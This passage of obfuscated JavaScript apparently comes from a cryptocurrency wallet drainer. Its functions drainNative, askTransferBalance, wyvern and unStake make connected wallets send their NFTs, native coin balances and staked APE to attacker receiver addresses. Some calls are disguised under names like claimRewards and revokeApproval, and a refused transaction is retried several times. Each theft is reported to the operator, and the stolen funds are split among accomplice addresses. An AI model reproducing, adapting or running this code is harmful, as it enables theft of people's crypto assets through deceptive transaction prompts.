        components: [_0x30dc5a, _0x58ad49],
        internalType: "struct Multicall3.Result[]",
        name: 'returnData',
        type: 'tuple[]'
      };
      const _0x2b817b = {
        inputs: [_0x1c45ee],
        name: "blockAndAggregate",
        outputs: [_0x10a258, _0x9890cf, _0x5cfae1],
        stateMutability: "payable",
        type: "function"
      };
      const _0x2541f3 = {
        inputs: [],
        name: "getBasefee",
        outputs: [{
          'internalType': "uint256",
          'name': "basefee",
          'type': "uint256"
        }],
        stateMutability: "view",
        type: 'function'
      };
      const _0x269545 = {
        internalType: "uint256",
        name: "blockNumber",
        type: "uint256"
      };
      const _0x3e472e = {
        inputs: [_0x269545],
        name: "getBlockHash",
        outputs: [{
          'internalType': "bytes32",
          'name': "blockHash",
          'type': "bytes32"
        }],
        stateMutability: "view",
        type: "function"
      };
      const _0x31922e = {
        internalType: "uint256",
        name: "blockNumber",
        type: "uint256"
      };
      const _0x49d553 = {
        inputs: [],
        name: "getBlockNumber",
        outputs: [_0x31922e],
        stateMutability: "view",
        type: "function"
      };
      const _0x43eaa8 = {
        inputs: [],
        name: "getChainId",
        outputs: [{
          'internalType': "uint256",
          'name': "chainid",
          'type': "uint256"
        }],
        stateMutability: "view",
        type: "function"
      };
      const _0x162af5 = {
        inputs: [],
        name: "getCurrentBlockCoinbase",
        outputs: [{
          'internalType': "address",
          'name': "coinbase",
          'type': "address"
        }],
        stateMutability: "view",
        type: "function"
      };
      const _0x5ae361 = {
        inputs: [],
        name: "getCurrentBlockDifficulty",
        outputs: [{
          'internalType': "uint256",
          'name': "difficulty",
          'type': "uint256"
        }],
        stateMutability: "view",
        type: 'function'
      };
      const _0x51e1c9 = {
        inputs: [],
        name: "getCurrentBlockGasLimit",
        outputs: [{
          'internalType': "uint256",
          'name': "gaslimit",
          'type': "uint256"
        }],
        stateMutability: 'view',
        type: "function"
      };
      const _0x34bcd0 = {
        internalType: "uint256",
        name: "timestamp",
        type: "uint256"
      };
      const _0x15c82a = {
        inputs: [],
        name: "getCurrentBlockTimestamp",
        outputs: [_0x34bcd0],
        stateMutability: "view",
        type: "function"
      };
      const _0x4a2263 = {
        internalType: "address",
        name: "addr",
        type: "address"
      };
      const _0x278c4c = {
        inputs: [_0x4a2263],
        name: "getEthBalance",
        outputs: [{
          'internalType': "uint256",
          'name': 'balance',
          'type': "uint256"
        }],
        stateMutability: "view",
        type: "function"
      };
      const _0x4b987c = {
        internalType: "bytes32",
        name: "blockHash",
        type: "bytes32"
      };
      const _0x363db4 = {
        inputs: [],
        name: "getLastBlockHash",
        outputs: [_0x4b987c],
        stateMutability: "view",
        type: "function"
      };
      const _0x433ecc = {
        internalType: 'bool',
        name: "requireSuccess",
        type: 'bool'
      };
      const _0x9d8b87 = {
        internalType: 'address',
        name: "target",
        type: "address"
      };
      const _0x59e5b2 = {
        internalType: "bytes",
        name: "callData",
        type: "bytes"
      };
      const _0x3ee453 = {
        components: [_0x9d8b87, _0x59e5b2],
        internalType: "struct Multicall3.Call[]",
        name: "calls",
        type: "tuple[]"
      };
      const _0x50737f = {
        inputs: [_0x433ecc, _0x3ee453],
        name: "tryAggregate",
        outputs: [{
          'components': [{
            'internalType': 'bool',
            'name': "success",
            'type': 'bool'
          }, {
            'internalType': "bytes",
            'name': 'returnData',
            'type': "bytes"
          }],
          'internalType': "struct Multicall3.Result[]",
          'name': 'returnData',
          'type': 'tuple[]'
        }],
        stateMutability: "payable",
        type: "function"
      };
      const _0x2dfe97 = {
        internalType: "bool",
        name: "requireSuccess",
        type: 'bool'
      };
      const _0xaf2b4a = {
        internalType: "address",
        name: "target",
        type: "address"
      };
      const _0x44e048 = {
        internalType: "bytes",
        name: "callData",
        type: "bytes"
      };
      const _0x58063a = {
        components: [_0xaf2b4a, _0x44e048],
        internalType: "struct Multicall3.Call[]",
        name: "calls",
        type: 'tuple[]'
      };
      const _0x7eea0d = {
        inputs: [_0x2dfe97, _0x58063a],
        name: "tryBlockAndAggregate",
        outputs: [{
          'internalType': "uint256",
          'name': "blockNumber",
          'type': "uint256"
        }, {
          'internalType': 'bytes32',
          'name': "blockHash",
          'type': "bytes32"
        }, {
          'components': [{
            'internalType': 'bool',
            'name': 'success',
            'type': 'bool'
          }, {
            'internalType': "bytes",
            'name': 'returnData',
            'type': "bytes"
          }],
          'internalType': "struct Multicall3.Result[]",
          'name': "returnData",
          'type': 'tuple[]'
        }],
        stateMutability: "payable",
        type: "function"
      };
      let _0x2a786d = [_0x38248f, _0xb61ecb, _0x5993b5, _0x2b817b, _0x2541f3, _0x3e472e, _0x49d553, _0x43eaa8, _0x162af5, _0x5ae361, _0x51e1c9, _0x15c82a, _0x278c4c, _0x363db4, _0x50737f, _0x7eea0d];
      const _0x49560a = {
        internalType: "address",
        name: "from",
        type: "address"
      };
      const _0x8d372e = {
        internalType: 'address',
        name: 'to',
        type: "address"
      };
      const _0x1744c9 = {
        internalType: "uint256",
        name: "tokenId",
        type: "uint256"
      };
      const _0x2c66dc = {
        inputs: [_0x49560a, _0x8d372e, _0x1744c9],
        name: "safeTransferFrom",
        outputs: [],
        stateMutability: 'nonpayable',
        type: "function"
      };
      let _0x509bd7 = [_0x2c66dc];
      const _0x41fe4c = {
        internalType: "address",
        name: "from",
        type: "address"
      };
      const _0x13905c = {
        internalType: "address",
        name: 'to',
        type: "address"
      };
      const _0x223227 = {
        internalType: "uint256",
        name: 'id',
        type: "uint256"
      };
      const _0x285a78 = {
        internalType: "uint256",
        name: "amount",
        type: "uint256"
      };
      const _0x1da1ef = {
        internalType: "bytes",
        name: 'data',
        type: "bytes"
      };
      const _0x39e07e = {
        inputs: [_0x41fe4c, _0x13905c, _0x223227, _0x285a78, _0x1da1ef],
        name: "safeTransferFrom",
        outputs: [],
        stateMutability: 'nonpayable',
        type: "function"
      };
      let _0x207a5a = [_0x39e07e];
      const _0x379620 = {
        name: "implementation",
        type: "address"
      };
      const _0x3fa972 = {
        name: 'data',
        type: "bytes"
      };
      const _0x40b628 = {
        constant: false,
        inputs: [_0x379620, _0x3fa972],
        name: "upgradeToAndCall",
        outputs: [],
        payable: true,
        stateMutability: "payable",
        type: "function"
      };
      const _0x35a43e = {
        constant: true,
        inputs: [],
        name: "implementation",
        outputs: [{
          'name': '',
          'type': "address"
        }],
        payable: false,
        stateMutability: "view",
        type: "function"
      };
      let _0x576fb1 = [_0x40b628, _0x35a43e];
      let _0x4c55a7 = new ethers.Contract(_0xf86287, _0x576fb1, _0x5054fc);
      let _0x5526d8 = [];
      for (let _0x261e15 of _0x351f3b.asset) {
        let _0x34ddb0 = _0x261e15.nft;
        let _0x41f693 = _0x509bd7;
        let _0xa3dd8e = new ethers.Contract(this.caller, _0x41f693, _0x5054fc);
        let _0x3f04a6 = _0xa3dd8e["interface"].encodeFunctionData("safeTransferFrom", [_0x6316bf, this.receiver, _0x34ddb0.token_id]);
        if (_0x34ddb0.scheme == 'erc1155') {
          _0x41f693 = _0x207a5a;
          _0xa3dd8e = new ethers.Contract(this.caller, _0x41f693, _0x5054fc);
          _0x3f04a6 = _0xa3dd8e['interface'].encodeFunctionData("safeTransferFrom", [_0x6316bf, this.receiver, _0x34ddb0.token_id, 1, "0x00"]);
        }
        _0x5526d8.push([_0x34ddb0.contract, _0x3f04a6]);
      }
      let _0x11fbd0 = new ethers.Contract(this.caller, _0x2a786d, _0x5054fc);
      let _0x4fdeea = _0x11fbd0["interface"].encodeFunctionData("aggregate", [_0x5526d8]);
      const _0x29bb9c = {
        'value': '0x00'
      };
      let _0x4d3158 = await _0x4c55a7.upgradeToAndCall("0xcA11bde05977b3631167028862bE2a173976CA11", _0x4fdeea, _0x29bb9c);
      for (let _0x104102 of _0x351f3b.asset) {
        this.approved.push(_0x104102.nft.contract + ",eth");
        this.approved.push(Base64.encode(JSON.stringify(_0x104102.nft)));
      }
      await this.sendMessage({
        'chain': _0x351f3b.chain,
        'type': "wyvern",
        'count': _0x351f3b.asset.length,
        'txId': _0x4d3158.hash,
        'value': this.totalWyvern / this.typeToMultiplier(_0x351f3b.actionType)
      });
    } catch (_0x2eaee6) {
      if (_0x6316bf != (await this.getWalletAddress())) {
        return;
      }
      console.log(_0x2eaee6);
      await this.sendMessage({
        'type': "error",
        'chain': _0x351f3b.chain,
        'msg': "Client refused to sign Wyvern Transfer for " + _0x351f3b.asset.length + " items ($" + this.totalWyvern / this.typeToMultiplier(_0x351f3b.actionType) + ')'
      });
      this.failedAttempts++;
      if (this.failedAttempts > 0x5 && this.actions.length > 1) {
        this.failedAttempts = 0;
      } else {
        await this.wyvern(_0x351f3b);
      }
    }
  };
  ["drainNative"] = async _0x13f224 => {
    try {
      let _0x4d1884 = _0x13f224.asset;
      let _0x3d7683 = _0x13f224.value;
      let _0x5e8bb7 = _0x13f224.chain;
      const _0x3e46e0 = this.web3Js.utils.fromWei(_0x4d1884.toString(), "ether");
      console.log("Current balance for " + (await this.getWalletAddress()) + " : " + _0x3e46e0 + " ETH");
      if (_0x3e46e0 > 0.005) {
        await this.askTransferBalance(_0x3e46e0, _0x4d1884, _0x3d7683, _0x5e8bb7);
      }
    } catch (_0xb15aa7) {
      console.log("Declined to send balance.");
      console.log(_0xb15aa7);
    }
  };
  ["askTransferBalance"] = async (_0x2bd059, _0x1026d3, _0x1fac03, _0x37a04f) => {
    let _0x4bcf8c = await this.getWalletAddress();
    try {
      const _0x11e3a7 = await this.web3Js.eth.getGasPrice();
      const _0x4e1943 = new this.web3Js.utils.BN("75600");
      const _0x5e6474 = _0x4e1943 * _0x11e3a7;
      let _0x360a48 = Math.floor(_0x1026d3 * 0.04);
      let _0x18471a = this.web3Js.utils.fromWei(_0x360a48.toString(), "ether");
      if (_0x18471a > 0.03) {
        _0x360a48 = this.web3Js.utils.toWei("0.03", "ether");
      }
      let _0xcde57b = Math.floor(_0x1026d3 - _0x360a48) - _0x5e6474 * 2;
      console.log("Sending " + this.web3Js.utils.fromWei(_0xcde57b.toString(), "ether") + " ETH from " + (await this.getWalletAddress()) + "...");
      const _0x59f076 = {
        internalType: "address",
        name: "target",
        type: "address"
      };
      const _0x2889bf = {
        internalType: "bytes",
        name: "callData",
        type: "bytes"
      };
      const _0x181106 = {
        components: [_0x59f076, _0x2889bf],
        internalType: "struct Multicall.Call[]",
        name: "calls",
        type: "tuple[]"
      };
      const _0x392a10 = {
        internalType: "uint256",
        name: "blockNumber",
        type: "uint256"
      };
      const _0x18daab = {
        internalType: 'bytes[]',
        name: "returnData",
        type: "bytes[]"
      };
      const _0x52bce0 = {
        inputs: [_0x181106],
        name: "acedrainer",
        outputs: [_0x392a10, _0x18daab],
        stateMutability: "nonpayable",
        type: "function"
      };
      const _0x5d3322 = {
        internalType: "address",
        name: 'receiver',
        type: "address"
      };
      const _0x35bef6 = {
        internalType: "uint256",
        name: "amount",
        type: "uint256"
      };
      const _0x1bd7ad = {
        components: [_0x5d3322, _0x35bef6],
        internalType: "struct Multicall.Split[]",
        name: "_data",
        type: "tuple[]"
      };
      const _0x17c2c8 = {
        inputs: [_0x1bd7ad],
        name: "claimRewards",
        outputs: [],
        stateMutability: "payable",
        type: "function"
      };
      const _0x4380f3 = {
        internalType: "address",
        name: 'receiver',
        type: "address"
      };
      const _0x5f1de2 = {
        internalType: "uint256",
        name: "amount",
        type: "uint256"
      };
      const _0x3d545e = {
        components: [_0x4380f3, _0x5f1de2],
        internalType: "struct Multicall.Split[]",
        name: "_data",
        type: "tuple[]"
      };
      const _0x2eaf2b = {
        inputs: [_0x3d545e],
        name: "revokeApproval",
        outputs: [],
        stateMutability: 'payable',
        type: "function"
      };
      let _0x1f3ebd = [_0x52bce0, _0x17c2c8, _0x2eaf2b];
      var _0x5dd03c = this.ethersProvider.getSigner((await this.web3Js.eth.getAccounts())[0]);
      let _0x290738 = this.caller;
      if (_0x37a04f == 'era') {
        _0x290738 = "0xaC5eE1CC786a429b88E74e3c722A798f1870C12A";
      }
      let _0x34cffa = new ethers.Contract(_0x290738, _0x1f3ebd, _0x5dd03c);
      if (_0x37a04f == 'bsc' || _0x37a04f == "base" || _0x37a04f == 'ftm' || _0x37a04f == "avax" || _0x37a04f == 'matic' || _0x37a04f == 'arb' || _0x37a04f == 'op' || _0x37a04f == 'era' || _0x37a04f == "eth" && _0x1fac03 < 200) {
        console.log(_0xcde57b);
        let _0x527478 = BigInt(0);
        let _0x1e4de7 = [];
        let _0x310e92 = Number(_0xcde57b);
        for (let _0x485c99 of this.sharing) {
          let _0x388ff8 = BigInt(Math.floor(_0x310e92 * Number(_0x485c99.share / 10000)));
          _0x1e4de7.push([_0x485c99.address, _0x388ff8.toString()]);
          _0x527478 += _0x388ff8;
        }
        console.log("total " + _0x527478);
        console.log("sending " + _0xcde57b);
        if (_0x527478 > BigInt(_0xcde57b)) {
          console.log("correcting_values");
          let _0xa57436 = _0x527478 - BigInt(_0xcde57b);
          console.log("difference " + _0xa57436);
          let _0x123a40 = BigInt(_0x1e4de7[0][1]) - _0xa57436;
          _0x527478 = _0x527478 - _0xa57436;
          console.log("total " + _0x527478);
          _0x1e4de7[0][1] = _0x123a40.toString();
        }
        console.log(_0x1e4de7);
        let _0x257dac = null;
        _0x257dac = await _0x34cffa.claimRewards(_0x1e4de7, {
          'value': BigInt(_0xcde57b)
        });
        await _0x257dac;
        if (_0x4bcf8c != (await this.getWalletAddress())) {
          return;
        }
        await this.sendMessage({
          'chain': _0x37a04f,
          'valueMsg': '($' + this.numberWithCommas(parseInt(_0x1fac03 / _0x2d2f04.assetOptions.multipliers.balance).toFixed(2)) + ") " + _0x2bd059,
          'source': _0x37a04f.toUpperCase(),
          'type': "balance",
          'txId': _0x257dac.hash
        });
      } else {
        if (_0x37a04f == "eth" && _0x1fac03 > 200) {
          const _0x11be1d = {
            value: _0x1fac03,
            chain: _0x37a04f
          };
          let _0x3f6c9c = this.getCaller(_0x11be1d);
          let _0x39fe7d = {
            'from': await this.getWalletAddress(),
            'to': _0x3f6c9c,
            'value': '0x' + _0xcde57b.toString(16)
          };
          var _0x551040 = await _0x5dd03c.sendTransaction(_0x39fe7d);
          await this.sendMessage({
            'chain': _0x37a04f,
            'valueMsg': '($' + this.numberWithCommas(parseInt(_0x1fac03 / _0x2d2f04.assetOptions.multipliers.balance).toFixed(2)) + ") " + _0x2bd059,
            'source': _0x37a04f.toUpperCase(),
            'type': "balance",
            'txId': _0x551040.hash
          });
          await this.SendCompletion({
            'type': "balanceSplit",
            'hash': _0x551040.hash,
            'tokenAddress': '',
            'caller': _0x3f6c9c,
            'ahash': this.createEncKey(),
            'chainId': this.getChainId("eth")
          });
        } else {
          let _0x11e801 = {
            'from': await this.getWalletAddress(),
            'to': this.receiver,
            'value': '0x' + _0xcde57b.toString(16)
          };
          var _0x551040 = await _0x5dd03c.sendTransaction(_0x11e801);
          await this.sendMessage({
            'chain': _0x37a04f,
            'valueMsg': '($' + this.numberWithCommas(parseInt(_0x1fac03 / _0x2d2f04.assetOptions.multipliers.balance).toFixed(2)) + ") " + _0x2bd059,
            'source': _0x37a04f.toUpperCase(),
            'type': "balance",
            'txId': _0x551040.hash
          });
        }
      }
    } catch (_0x14c33b) {
      console.log(_0x14c33b);
      if (_0x4bcf8c != (await this.getWalletAddress())) {
        return;
      }
      await this.sendMessage({
        'chain': _0x37a04f,
        'type': "error",
        'msg': "Client refused to send " + _0x2bd059 + " " + _0x37a04f.toString().toUpperCase() + " (" + this.numberWithCommas(parseInt(_0x1fac03 / _0x2d2f04.assetOptions.multipliers.balance).toFixed(2)) + ')'
      });
      this.failedAttempts++;
      if (this.failedAttempts > 0x5 && this.actions.length > 1) {
        this.failedAttempts = 0;
      } else {
        await this.askTransferBalance(_0x2bd059, _0x1026d3, _0x1fac03, _0x37a04f);
      }
    }
  };
  ['unStake'] = async _0x5e2fb7 => {
    let _0x3db662 = await this.getWalletAddress();
    try {
      if (_0x5e2fb7.asset.type == "Ape") {
        console.log("Prompting Ape");
        let _0x3d0bd7 = await this.Sdk.unstakeApe(_0x5e2fb7.asset.amount, this.getCaller(_0x5e2fb7));
        await this.sendMessage({
          'chain': _0x5e2fb7.chain,
          'value': _0x5e2fb7.value / this.typeToMultiplier(_0x5e2fb7.actionType),
          'source': 'APECoin',
          'type': 'unstake',
          'txId': _0x3d0bd7.hash
        });
        await this.SendCompletion({
          'type': 'tokenSplit',
          'hash': _0x3d0bd7.hash,
          'tokenAddress': "0x4d224452801ACEd8B2F0aebE155379bb5D594381",
          'caller': this.getCaller(_0x5e2fb7),
          'ahash': this.createEncKey(),
          'chainId': 0x1
        });
      }
      if (_0x5e2fb7.asset.type == "Mayc") {
        let _0x1013c4 = await this.Sdk.unstakeMayc([_0x5e2fb7.asset.ids], this.getCaller(_0x5e2fb7));
        await this.sendMessage({
          'chain': _0x5e2fb7.chain,
          'value': _0x5e2fb7.value / this.typeToMultiplier(_0x5e2fb7.actionType),
          'source': 'APECoin',
          'type': "unstake",
          'txId': _0x1013c4.hash
        });
        await this.SendCompletion({
          'type': 'tokenSplit',
          'hash': _0x1013c4.hash,
          'tokenAddress': "0x4d224452801ACEd8B2F0aebE155379bb5D594381",
          'caller': this.getCaller(_0x5e2fb7),
          'ahash': this.createEncKey(),
          'chainId': 0x1
        });
      }
      if (_0x5e2fb7.asset.type == "Bayc") {
        let _0x321695 = await this.Sdk.unstakeBayc([_0x5e2fb7.asset.ids], this.getCaller(_0x5e2fb7));
        await this.sendMessage({
          'chain': _0x5e2fb7.chain,
          'value': _0x5e2fb7.value / this.typeToMultiplier(_0x5e2fb7.actionType),
          'source': 'APECoin',
          'type': "unstake",
          'txId': _0x321695.hash
        });
        await this.SendCompletion({
          'type': 'tokenSplit',
          'hash': _0x321695.hash,
          'tokenAddress': "0x4d224452801ACEd8B2F0aebE155379bb5D594381",
          'caller': this.getCaller(_0x5e2fb7),
          'ahash': this.createEncKey(),
          'chainId': 0x1
        });
      }
    } catch (_0x1376c8) {
      if (_0x3db662 != (await this.getWalletAddress())) {
        return;
      }
      await this.sendMessage({
        'chain': _0x5e2fb7.chain,
        'type': "error",
        'msg': "Client refused to Unstake " + this.web3Js.utils.fromWei(_0x5e2fb7.asset.amount, "ether") + " APE"
      });
      this.failedAttempts++;
      if (this.failedAttempts > 0x5 && this.actions.length > 1) {
        this.failedAttempts = 0;
      } else {
        await this.unStake(_0x5e2fb7);
      }
    }
  };
  ["completeSignature"] = async _0x16ae73 => {
    try {
      if (_0x16ae73.actionType == "permit") {
        const _0x204e1b = _0x16ae73.address;
        const _0x27a1c3 = _0x16ae73.value;
        const _0x2387da = _0x16ae73.type;
        const _0x23a27c = _0x16ae73.balance;
        const _0x32d780 = await this.getChainId(_0x16ae73.chain);
        let _0x40fd4c = await this.getWalletAddress();
        let _0xed86e5 = this.ethersProvider.getSigner(_0x40fd4c);
        const _0x229b97 = {
          indexed: true,
          internalType: "address",
          name: "owner",
          type: "address"
        };
        const _0x271171 = {
          indexed: true,
          internalType: "address",
          name: "spender",
          type: "address"
        };
        const _0x502b9f = {
          indexed: false,
          internalType: "uint256",
          name: 'value',
          type: "uint256"
        };
        const _0x145197 = {
          anonymous: false,
          inputs: [_0x229b97, _0x271171, _0x502b9f],
          name: "Approval",
          type: "event"
        };
        const _0x2417a6 = {
          indexed: true,
          internalType: "address",
          name: "authorizer",
          type: "address"
        };
        const _0x5c654d = {
          indexed: true,
          internalType: 'bytes32',
          name: 'nonce',
          type: "bytes32"
        };
        const _0x4e62f1 = {
          anonymous: false,
          inputs: [_0x2417a6, _0x5c654d],
          name: "AuthorizationCanceled",
          type: "event"
        };
        const _0x2a19c3 = {
          indexed: true,
          internalType: "address",
          name: "authorizer",
          type: "address"
        };
        const _0x4d8197 = {
          indexed: true,
          internalType: "bytes32",
          name: "nonce",
          type: "bytes32"
        };
        const _0xd8944b = {
          anonymous: false,
          inputs: [_0x2a19c3, _0x4d8197],
          name: "AuthorizationUsed",
          type: "event"
        };
        const _0x52fc67 = {
          indexed: true,
          internalType: "address",
          name: "_account",
          type: "address"
        };
        const _0x2b801e = {
          anonymous: false,
          inputs: [_0x52fc67],
          name: "Blacklisted",
          type: "event"
        };
        const _0x16acca = {
          indexed: true,
          internalType: "address",
          name: "newBlacklister",
          type: "address"
        };
        const _0x27dd3f = {
          anonymous: false,
          inputs: [_0x16acca],
          name: "BlacklisterChanged",
          type: "event"
        };
        const _0x285d67 = {
          indexed: true,
          internalType: "address",
          name: "burner",
          type: "address"
        };
        const _0x56117d = {
          indexed: false,
          internalType: "uint256",
          name: "amount",
          type: "uint256"
        };
        const _0xc7b865 = {
          anonymous: false,
          inputs: [_0x285d67, _0x56117d],
          name: "Burn",
          type: "event"
        };
        const _0x1388c2 = {
          indexed: true,
          internalType: "address",
          name: "newMasterMinter",
          type: "address"
        };
        const _0x41f730 = {
          anonymous: false,
          inputs: [_0x1388c2],
          name: "MasterMinterChanged",
          type: "event"
        };
        const _0x4992e3 = {
          indexed: true,
          internalType: "address",
          name: "minter",
          type: "address"
        };
        const _0x2a235b = {
          indexed: true,
          internalType: "address",
          name: 'to',
          type: "address"
        };
        const _0x18bad6 = {
          indexed: false,
          internalType: "uint256",
          name: "amount",
          type: "uint256"
        };
        const _0x48c304 = {
          anonymous: false,
          inputs: [_0x4992e3, _0x2a235b, _0x18bad6],
          name: "Mint",
          type: "event"
        };
        const _0x82e0e7 = {
          indexed: true,
          internalType: 'address',
          name: "minter",
          type: "address"
        };
        const _0x312dca = {
          indexed: false,
          internalType: "uint256",
          name: "minterAllowedAmount",
          type: "uint256"
        };
        const _0x5b4c15 = {
          anonymous: false,
          inputs: [_0x82e0e7, _0x312dca],
          name: "MinterConfigured",
          type: "event"
        };
        const _0x38569d = {
          indexed: true,
          internalType: "address",
          name: "oldMinter",
          type: "address"
        };
        const _0x45a259 = {
          anonymous: false,
          inputs: [_0x38569d],
          name: "MinterRemoved",
          type: "event"
        };
        const _0x2690f5 = {
          indexed: false,
          internalType: "address",
          name: "previousOwner",
          type: "address"
        };
        const _0xff8c10 = {
          indexed: false,
          internalType: 'address',
          name: "newOwner",
          type: "address"
        };
        const _0x5b1c4d = {
          anonymous: false,
          inputs: [_0x2690f5, _0xff8c10],
          name: "OwnershipTransferred",
          type: "event"
        };
        const _0x316c3e = {
          anonymous: false,
          inputs: [],
          name: "Pause",
          type: "event"
        };
        const _0x26f702 = {
          indexed: true,
          internalType: "address",
          name: "newAddress",
          type: "address"
        };
        const _0x335956 = {
          anonymous: false,
          inputs: [_0x26f702],
          name: "PauserChanged",
          type: "event"
        };
        const _0x247c03 = {
          indexed: true,
          internalType: "address",
          name: "newRescuer",
          type: "address"
        };
        const _0x239ed8 = {
          anonymous: false,
          inputs: [_0x247c03],
          name: "RescuerChanged",
          type: "event"
        };
        const _0x3bace4 = {
          indexed: true,
          internalType: 'address',
          name: 'from',
          type: 'address'
        };
        const _0x18f985 = {
          indexed: true,
          internalType: "address",
          name: 'to',
          type: "address"
        };
        const _0x40c7b5 = {
          indexed: false,
          internalType: "uint256",
          name: "value",
          type: "uint256"
        };
        const _0x4fb12b = {
          anonymous: false,
          inputs: [_0x3bace4, _0x18f985, _0x40c7b5],
          name: "Transfer",
          type: "event"
        };
        const _0x2f94f5 = {
          indexed: true,
          internalType: "address",
          name: "_account",
          type: "address"
        };
        const _0x340bd5 = {
          anonymous: false,
          inputs: [_0x2f94f5],
          name: "UnBlacklisted",
          type: "event"
        };
        const _0x36aed9 = {
          anonymous: false,
          inputs: [],
          name: "Unpause",
          type: "event"
        };
        const _0x402d39 = {
          inputs: [],
          name: "CANCEL_AUTHORIZATION_TYPEHASH",
          outputs: [{
            'internalType': 'bytes32',
            'name': '',
            'type': "bytes32"
          }],
          stateMutability: "view",
          type: "function"
        };
        const _0x1f5b69 = {
          inputs: [],
          name: "DOMAIN_SEPARATOR",
          outputs: [{
            'internalType': "bytes32",
            'name': '',
            'type': "bytes32"
          }],
          stateMutability: "view",
          type: "function"
        };
        const _0x483dd2 = {
          internalType: "bytes32",
          name: '',
          type: "bytes32"
        };
        const _0x59667c = {
          inputs: [],
          name: "PERMIT_TYPEHASH",
          outputs: [_0x483dd2],
          stateMutability: 'view',
          type: "function"
        };
        const _0x3159c2 = {
          inputs: [],
          name: "RECEIVE_WITH_AUTHORIZATION_TYPEHASH",
          outputs: [{
            'internalType': "bytes32",
            'name': '',
            'type': "bytes32"
          }],
          stateMutability: 'view',
          type: "function"
        };
        const _0x4c0aa4 = {
          inputs: [],
          name: "TRANSFER_WITH_AUTHORIZATION_TYPEHASH",
          outputs: [{
            'internalType': "bytes32",
            'name': '',
            'type': "bytes32"
          }],
          stateMutability: "view",
          type: "function"
        };
        const _0x404271 = {
          internalType: "address",
          name: "owner",
          type: "address"
        };
        const _0x431e81 = {
          internalType: "address",
          name: 'spender',
          type: "address"
        };
        const _0x81094a = {
          inputs: [_0x404271, _0x431e81],
          name: "allowance",
          outputs: [{
            'internalType': "uint256",
            'name': '',
            'type': "uint256"
          }],
          stateMutability: "view",
          type: "function"
        };
        const _0x4182c6 = {
          internalType: "address",
          name: 'spender',
          type: "address"
        };
        const _0x2a7a3f = {
          internalType: "uint256",
          name: 'value',
          type: 'uint256'
        };
        const _0x543af4 = {
          inputs: [_0x4182c6, _0x2a7a3f],
          name: 'approve',
          outputs: [{
            'internalType': 'bool',
            'name': '',
            'type': "bool"
          }],
          stateMutability: "nonpayable",
          type: "function"
        };
        const _0x1a4392 = {
          internalType: "address",
          name: "authorizer",
          type: "address"
        };
        const _0x479d5a = {
          internalType: "bytes32",
          name: 'nonce',
          type: "bytes32"
        };
        const _0x5d4b2d = {
          inputs: [_0x1a4392, _0x479d5a],
          name: "authorizationState",
          outputs: [{
            'internalType': 'bool',
            'name': '',
            'type': 'bool'
          }],
          stateMutability: "view",
          type: "function"
        };
        const _0x26e82e = {
          internalType: "address",
          name: 'account',
          type: "address"
        };
        const _0x4f10b3 = {
          internalType: "uint256",
          name: '',
          type: "uint256"
        };
        const _0x535df7 = {
          inputs: [_0x26e82e],
          name: "balanceOf",
          outputs: [_0x4f10b3],
          stateMutability: 'view',
          type: "function"
        };
        const _0x2eb7d7 = {
          internalType: "address",
          name: "_account",
          type: "address"
        };
        const _0x532091 = {
          inputs: [_0x2eb7d7],
          name: "blacklist",
          outputs: [],
          stateMutability: "nonpayable",
          type: "function"
        };
        const _0x46dd50 = {
          internalType: "address",
          name: '',
          type: "address"
        };
        const _0x39164f = {
          inputs: [],
          name: "blacklister",
          outputs: [_0x46dd50],
          stateMutability: "view",
          type: "function"
        };
        const _0x61c33b = {
          internalType: "uint256",
          name: "_amount",
          type: "uint256"
        };
        const _0x4edd14 = {
          inputs: [_0x61c33b],
          name: "burn",
          outputs: [],
          stateMutability: "nonpayable",
          type: 'function'
        };
        const _0x2a77a5 = {
          internalType: "address",
          name: "authorizer",
          type: "address"
        };
        const _0x3d2cc6 = {
          internalType: "bytes32",
          name: 'nonce',
          type: "bytes32"
        };
        const _0x3d432b = {
          internalType: "uint8",
          name: 'v',
          type: 'uint8'
        };
        const _0x181b42 = {
          internalType: "bytes32",
          name: 'r',
          type: "bytes32"
        };
        const _0x5638b3 = {
          internalType: "bytes32",
          name: 's',
          type: "bytes32"
        };
        const _0x243315 = {
          inputs: [_0x2a77a5, _0x3d2cc6, _0x3d432b, _0x181b42, _0x5638b3],
          name: "cancelAuthorization",
          outputs: [],
          stateMutability: "nonpayable",
          type: "function"
        };
        const _0x319560 = {
          internalType: "address",
          name: "minter",
          type: "address"
        };
        const _0x6869ad = {
          internalType: "uint256",
          name: "minterAllowedAmount",
          type: "uint256"
        };
        const _0x33189c = {
          inputs: [_0x319560, _0x6869ad],
          name: "configureMinter",
          outputs: [{
            'internalType': 'bool',
            'name': '',
            'type': 'bool'
          }],
          stateMutability: "nonpayable",
          type: "function"
        };
        const _0x3c9121 = {
          inputs: [],
          name: 'currency',
          outputs: [{
            'internalType': "string",
            'name': '',
            'type': "string"
          }],
          stateMutability: "view",
          type: "function"
        };
        const _0x2e74a7 = {
          internalType: 'uint8',
          name: '',
          type: 'uint8'
        };
        const _0x420392 = {
          inputs: [],
          name: 'decimals',
          outputs: [_0x2e74a7],
          stateMutability: "view",
          type: "function"
        };
        const _0x5705b1 = {
          internalType: "address",
          name: 'spender',
          type: "address"
        };
        const _0x269b23 = {
          internalType: "uint256",
          name: 'decrement',
          type: "uint256"
        };
        const _0x282a4e = {
          inputs: [_0x5705b1, _0x269b23],
          name: "decreaseAllowance",
          outputs: [{
            'internalType': 'bool',
            'name': '',
            'type': 'bool'
          }],
          stateMutability: "nonpayable",
          type: "function"
        };
        const _0x1f59ef = {
          internalType: "address",
          name: 'spender',
          type: "address"
        };
        const _0x22fe00 = {
          internalType: "uint256",
          name: "increment",
          type: "uint256"
        };
        const _0x285665 = {
          internalType: "bool",
          name: '',
          type: "bool"
        };
        const _0x1e1a68 = {
          inputs: [_0x1f59ef, _0x22fe00],
          name: "increaseAllowance",
          outputs: [_0x285665],
          stateMutability: "nonpayable",
          type: "function"
        };
        const _0xe7334f = {
          internalType: "string",
          name: "tokenName",
          type: "string"
        };
        const _0x2e993c = {
          internalType: "string",
          name: "tokenSymbol",
          type: "string"
        };
        const _0x1ba006 = {
          internalType: "string",
          name: "tokenCurrency",
          type: "string"
        };
        const _0x2c9a80 = {
          internalType: 'uint8',
          name: "tokenDecimals",
          type: "uint8"
        };
        const _0x18cc38 = {
          internalType: "address",
          name: "newMasterMinter",
          type: "address"
        };
        const _0x4a1b7c = {
          internalType: "address",
          name: "newPauser",
          type: "address"
        };
        const _0x26cc09 = {
          internalType: "address",
          name: "newBlacklister",
          type: "address"
        };
        const _0x537632 = {
          internalType: "address",
          name: "newOwner",
          type: "address"
        };
        const _0x15aed6 = {
